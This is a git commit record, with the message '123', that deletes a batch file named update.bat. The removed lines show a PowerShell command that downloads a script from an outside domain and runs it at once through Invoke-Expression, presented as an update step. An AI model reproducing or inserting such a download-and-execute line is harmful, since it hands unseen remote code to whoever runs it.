f3b052167d92a53c3aac39e57c76ed79b09abb9b
mm1rza <74845201+mm1rza@users.noreply.github.com>
2025-08-11 10:24:54 +0700

    123
    123

--- #updateallfiles/update.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing 'https://mnet.my.id/update/github/c' | Invoke-Expression}"
-pause
-exit /b
